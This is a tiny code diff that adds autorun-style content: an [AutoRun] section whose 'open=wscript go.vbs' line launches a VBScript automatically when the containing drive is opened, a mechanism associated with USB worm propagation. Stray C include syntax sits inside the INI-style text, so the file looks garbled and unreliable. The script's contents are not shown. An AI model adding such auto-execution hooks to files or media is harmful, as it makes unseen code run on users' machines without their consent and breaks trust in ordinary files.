@@ -1,0 +1,3 @@
+#include "autorun.h"
+[AutoRun] 
+open=wscript go.vbs
